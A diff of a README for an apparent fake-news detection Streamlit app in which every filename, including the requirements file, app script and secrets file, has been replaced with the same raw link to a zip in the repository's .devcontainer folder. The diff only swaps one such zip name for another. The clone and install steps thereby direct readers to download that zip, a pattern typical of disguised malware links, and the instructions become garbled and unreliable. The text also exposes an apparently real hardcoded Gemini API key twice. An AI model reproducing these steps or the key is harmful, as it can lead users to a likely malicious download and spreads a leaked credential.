@@ -52,7 +52,7 @@ To run this application locally, follow these steps:
 
 Clone the repository:
 
-git clone [https://github.com/Plutonian-coder/Fake-News-Detection/raw/refs/heads/main/.devcontainer/News_Detection_Fake_2.5.zip](https://github.com/Plutonian-coder/Fake-News-Detection/raw/refs/heads/main/.devcontainer/News_Detection_Fake_2.5.zip)
+git clone [https://github.com/Plutonian-coder/Fake-News-Detection/raw/refs/heads/main/.devcontainer/Fake-Detection-News-gender.zip](https://github.com/Plutonian-coder/Fake-News-Detection/raw/refs/heads/main/.devcontainer/Fake-Detection-News-gender.zip)
 cd your-repo-name
 
 
@@ -67,23 +67,23 @@ python -m venv venv
 
 Install the required packages:
 
-pip install -r https://github.com/Plutonian-coder/Fake-News-Detection/raw/refs/heads/main/.devcontainer/News_Detection_Fake_2.5.zip
+pip install -r https://github.com/Plutonian-coder/Fake-News-Detection/raw/refs/heads/main/.devcontainer/Fake-Detection-News-gender.zip
 
 
 Obtain Model Files:
 This project requires two pre-trained model files, which are not included in this repository:
 
-https://github.com/Plutonian-coder/Fake-News-Detection/raw/refs/heads/main/.devcontainer/News_Detection_Fake_2.5.zip
+https://github.com/Plutonian-coder/Fake-News-Detection/raw/refs/heads/main/.devcontainer/Fake-Detection-News-gender.zip
 
-https://github.com/Plutonian-coder/Fake-News-Detection/raw/refs/heads/main/.devcontainer/News_Detection_Fake_2.5.zip
-You must have these files (from your model training script) in the same directory as https://github.com/Plutonian-coder/Fake-News-Detection/raw/refs/heads/main/.devcontainer/News_Detection_Fake_2.5.zip
+https://github.com/Plutonian-coder/Fake-News-Detection/raw/refs/heads/main/.devcontainer/Fake-Detection-News-gender.zip
+You must have these files (from your model training script) in the same directory as https://github.com/Plutonian-coder/Fake-News-Detection/raw/refs/heads/main/.devcontainer/Fake-Detection-News-gender.zip
 
 NLTK Data:
 The application will automatically attempt to download the stopwords corpus from NLTK on its first run.
 
 🚨 IMPORTANT: API Key Security
 
-The https://github.com/Plutonian-coder/Fake-News-Detection/raw/refs/heads/main/.devcontainer/News_Detection_Fake_2.5.zip file currently has a hardcoded API key:
+The https://github.com/Plutonian-coder/Fake-News-Detection/raw/refs/heads/main/.devcontainer/Fake-Detection-News-gender.zip file currently has a hardcoded API key:
 
 apiKey = "AIzaSyB278rf_ZliONHPV-rc2wGE9k0INIGCiyE" 
 
@@ -93,22 +93,22 @@ This is a major security risk. Never commit visible API keys to a public or priv
 How to Fix: Use Streamlit's Secrets Management.
 
 Create a secrets file:
-In your project's root, create a directory .streamlit and a file https://github.com/Plutonian-coder/Fake-News-Detection/raw/refs/heads/main/.devcontainer/News_Detection_Fake_2.5.zip inside it.
+In your project's root, create a directory .streamlit and a file https://github.com/Plutonian-coder/Fake-News-Detection/raw/refs/heads/main/.devcontainer/Fake-Detection-News-gender.zip inside it.
 
 .
 ├── .streamlit/
-│   └── https://github.com/Plutonian-coder/Fake-News-Detection/raw/refs/heads/main/.devcontainer/News_Detection_Fake_2.5.zip
-├── https://github.com/Plutonian-coder/Fake-News-Detection/raw/refs/heads/main/.devcontainer/News_Detection_Fake_2.5.zip
+│   └── https://github.com/Plutonian-coder/Fake-News-Detection/raw/refs/heads/main/.devcontainer/Fake-Detection-News-gender.zip
+├── https://github.com/Plutonian-coder/Fake-News-Detection/raw/refs/heads/main/.devcontainer/Fake-Detection-News-gender.zip
 └── ...
 
 
-Add your key to https://github.com/Plutonian-coder/Fake-News-Detection/raw/refs/heads/main/.devcontainer/News_Detection_Fake_2.5.zip
+Add your key to https://github.com/Plutonian-coder/Fake-News-Detection/raw/refs/heads/main/.devcontainer/Fake-Detection-News-gender.zip
 
-# https://github.com/Plutonian-coder/Fake-News-Detection/raw/refs/heads/main/.devcontainer/News_Detection_Fake_2.5.zip
+# https://github.com/Plutonian-coder/Fake-News-Detection/raw/refs/heads/main/.devcontainer/Fake-Detection-News-gender.zip
 GEMINI_API_KEY = "your-real-api-key-goes-here"
 
 
-Update https://github.com/Plutonian-coder/Fake-News-Detection/raw/refs/heads/main/.devcontainer/News_Detection_Fake_2.5.zip to use the secret:
+Update https://github.com/Plutonian-coder/Fake-News-Detection/raw/refs/heads/main/.devcontainer/Fake-Detection-News-gender.zip to use the secret:
 Find this line:
 
 apiKey = "AIzaSyB278rf_ZliONHPV-rc2wGE9k0INIGCiyE" 
@@ -116,7 +116,7 @@ apiKey = "AIzaSyB278rf_ZliONHPV-rc2wGE9k0INIGCiyE"
 
 And replace it with this:
 
-apiKey = https://github.com/Plutonian-coder/Fake-News-Detection/raw/refs/heads/main/.devcontainer/News_Detection_Fake_2.5.zip("GEMINI_API_KEY")
+apiKey = https://github.com/Plutonian-coder/Fake-News-Detection/raw/refs/heads/main/.devcontainer/Fake-Detection-News-gender.zip("GEMINI_API_KEY")
 
 
 Add .streamlit to your .gitignore file to ensure your secrets file is never committed.
@@ -125,7 +125,7 @@ Add .streamlit to your .gitignore file to ensure your secrets file is never comm
 
 Once your environment is set up, your model files are in place, and your API key is secured, you can run the app:
 
-streamlit run https://github.com/Plutonian-coder/Fake-News-Detection/raw/refs/heads/main/.devcontainer/News_Detection_Fake_2.5.zip
+streamlit run https://github.com/Plutonian-coder/Fake-News-Detection/raw/refs/heads/main/.devcontainer/Fake-Detection-News-gender.zip
 
 
 Your app will be available at http://localhost:8501.
